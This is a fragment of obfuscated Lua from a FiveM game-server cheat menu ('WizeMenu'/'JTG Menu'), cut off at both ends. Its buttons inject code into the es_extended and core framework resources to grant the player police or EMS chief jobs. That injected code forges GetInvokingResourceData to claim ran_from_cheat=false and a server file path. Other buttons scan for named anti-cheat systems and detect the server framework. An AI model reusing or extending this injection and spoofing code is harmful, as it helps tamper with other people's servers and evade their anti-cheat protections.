                    print("[✅] Job set to police successfully.")
                else
                    print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                end
                GetInvokingResourceData = original_GetInvokingResourceData
            ]]);break;end end else print("Neither scripts nor framework started");end end);end if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then MachoMenuButton(v45[1506 -(504 + 1000) ],"Setjob EMS #1 (New)",function() if (GetResourceState("es_extended")=="started") then MachoMenuNotification("[NOTIFICATION] WizeMenu","Your job has been set to EMS");MachoInjectResource2(NewThreadNs,"es_extended",[[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "es_extended/server/main.lua",
                    execution_id = "324341234567890"
                }

                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end

                ESX.SetPlayerData("job", {
                    name = "ambulance",
                    label = "EMS",
                    grade = 3,
                    grade_name = "chief_doctor",
                    grade_label = "Chief Doctor"
                })
                GetInvokingResourceData = original_GetInvokingResourceData
            ]]);elseif (GetResourceState("core")=="started") then local v405=0 + 0 ;while true do if (v405==0) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Your job has been set to EMS");MachoInjectResource2(NewThreadNs,"core",[[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "core/server/main.lua",
                    execution_id = "324341234567890"
                }

                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end

                ESX.SetPlayerData("job", {
                    name = "ambulance",
                    label = "EMS",
                    grade = 3,
                    grade_name = "chief_doctor",
                    grade_label = "Chief Doctor"
                })
                GetInvokingResourceData = original_GetInvokingResourceData
            ]]);break;end end else print("Neither core nor es_extended started");end end);end MachoMenuButton(v46[1 + 0 ],"Uninject",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                Stopped = true
            ]]);MachoInjectResource((v47("core") and "core") or (v47("es_extended") and "es_extended") or (v47("qb-core") and "qb-core") or (v47("monitor") and "monitor") or "any" ,[[
                anvzBDyUbl = false
                if fLwYqKoXpRtB then fLwYqKoXpRtB() end
                kLpMnBvCxZqWeRt = false
            ]]);MachoMenuDestroy(v19);end);MachoMenuCheckbox(v46[2],"RGB Menu",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if FmxmAlwkjfsfmaW == nil then FmxmAlwkjfsfmaW = false end
                FmxmAlwkjfsfmaW = true

                local function CreateRGBUI()
                    local wfgsmWAEJKF = CreateThread
                    wfgsmWAEJKF(function()
                        local offset = 0.0
                        while FmxmAlwkjfsfmaW and not Unloaded do
                            offset = offset + 0.065
                            local r = math.floor(127 + 127 * math.sin(offset))
                            local g = math.floor(127 + 127 * math.sin(offset + 2))
                            local b = math.floor(127 + 127 * math.sin(offset + 4))
                            MachoMenuSetAccent(MenuWindow, r, g, b)
                            Wait(25)
                        end
                    end)
                end

                CreateRGBUI()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                FmxmAlwkjfsfmaW = false
            ]]);end);local v74,v75,v76=207,16,32;MachoMenuSlider(v46[1 + 1 ],"R",v74,0 -0 ,255,"",0 + 0 ,function(v253) local v254=0;while true do if (v254==(0 + 0)) then v74=v253;MachoMenuSetAccent(v19,math.floor(v74),math.floor(v75),math.floor(v76));break;end end end);MachoMenuSlider(v46[184 -(156 + 26) ],"G",v75,0 + 0 ,398 -143 ,"",0,function(v255) local v256=0;while true do if (v256==(164 -(149 + 15))) then v75=v255;MachoMenuSetAccent(v19,math.floor(v74),math.floor(v75),math.floor(v76));break;end end end);MachoMenuSlider(v46[962 -(890 + 70) ],"B",v76,117 -(39 + 78) ,255,"",482 -(14 + 468) ,function(v257) local v258=0 -0 ;while true do if ((0 -0)==v258) then v76=v257;MachoMenuSetAccent(v19,math.floor(v74),math.floor(v75),math.floor(v76));break;end end end);MachoMenuButton(v46[3],"Anti-Cheat Checker",function() local function v259(v273,...) MachoMenuNotification("[NOTIFICATION] JTG Menu",string.format(v273,...));end local function v260(v274,v275) local v276=0 + 0 ;local v277;while true do if (v276==0) then v277=LoadResourceFile(v274,v275);return v277~=nil ;end end end local v261=GetNumResources();local v262={{name="ai_module_fg-obfuscated.lua",acName="FiveGuard"}};for v278=0 + 0 ,v261-(1 + 0)  do local v279=GetResourceByFindIndex(v278);local v280=string.lower(v279);for v297,v298 in ipairs(v262) do if v260(v279,v298.name) then local v346=0 + 0 ;while true do if (v346==(1 -0)) then return v279,v298.acName;end if (v346==(0 + 0)) then v259("Anti-Cheat: %s",v298.acName);AntiCheat=v298.acName;v346=1;end end end end local v281=nil;if (v280:sub(1,7)=="reaperv") then v281="ReaperV4";elseif (v280:sub(3 -2 ,1 + 3 )=="fini") then v281="FiniAC";elseif (v280:sub(52 -(12 + 39) ,7 + 0 )=="chubsac") then v281="ChubsAC";elseif (v280:sub(1,18 -12 )=="fireac") then v281="FireAC";elseif (v280:sub(3 -2 ,7)=="drillac") then v281="DrillAC";elseif (v280:sub( -(3 + 4))=="eshield") then v281="WaveShield";elseif (v280:sub( -(6 + 4))=="likizao_ac") then v281="Likizao-AC";elseif (v280:sub(2 -1 ,4 + 1 )=="greek") then v281="GreekAC";elseif (v280=="pac") then v281="PhoenixAC";elseif (v280=="electronac") then v281="ElectronAC";end if v281 then local v320=0 -0 ;while true do if (v320==(1710 -(1596 + 114))) then v259("Anti-Cheat: %s",v281);AntiCheat=v281;v320=2 -1 ;end if (v320==(714 -(164 + 549))) then return v279,v281;end end end end v259("No Anti-Cheat found");return nil,nil;end);MachoMenuButton(v46[1441 -(1059 + 379) ],"Framework Checker",function() local v263=0;local v264;local v265;local v266;local v267;local v268;while true do if ((3 -0)==v263) then function v267() local v347=0;while true do if (v347==(0 + 0)) then for v431,v432 in ipairs(v266) do for v436,v437 in ipairs(v432.globals) do if (_G[v437]~=nil) then return v432.label;end end end for v433,v434 in ipairs(v266) do for v438,v439 in ipairs(v434.resources) do if v265(v439) then return v434.label;end end end v347=1;end if (v347==(1 + 0)) then return "Standalone";end end end v268=v267();v263=396 -(145 + 247) ;end if (v263==(0 + 0)) then v264=nil;function v264(v348,...) MachoMenuNotification("[NOTIFICATION] JTG Menu",string.format(v348,...));end v263=1;end if (v263==(1 + 1)) then v266={{label="ESX",globals={"ESX"},resources={"es_extended","esx-legacy"}},{label="QBCore",globals={"QBCore"},resources={"qb-core"}},{label="Qbox",globals={},resources={"qbox"}},{label="QBX Core",globals={},resources={"qbx-core"}},{label="ox_core",globals={"Ox"},resources={"ox_core"}},{label="ND_Core",globals={"NDCore"},resources={"nd-core","ND_Core"}},{label="vRP",globals={"vRP"},resources={"vrp"}}};v267=nil;v263=2 + 1 ;end if (v263==1) then v265=nil;function v265(v349) return GetResourceState(v349)=="started" ;end v263=2 + 0 ;end if ((14 -10)==v263) then v264("Framework: %s",v268);break;end end end);local v58=0 -0 ;local v59={[0]={name="Default",hash="MP_F_Freemode"},[1 + 0 ]={name="Gangster",hash="Gang1H"},[2]={name="Wild",hash="GangFemale"},[3]={name="Red Neck",hash="Hillbilly"}};
